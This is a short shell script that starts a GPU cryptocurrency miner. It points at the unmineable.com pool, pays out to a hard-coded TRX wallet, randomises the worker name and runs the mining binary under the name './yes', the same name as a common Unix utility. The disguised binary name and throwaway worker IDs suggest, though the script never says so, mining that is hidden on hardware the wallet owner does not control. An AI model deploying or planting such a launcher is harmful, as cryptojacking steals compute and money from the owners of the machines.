POOL=rx-us.unmineable.com:3333
WALLET=TRX:TLx2m9riwCk8DfL7g7dRbpeqC7mgMVVNHF
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo V4FMaYSr-$(shuf -i 1911-748849 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
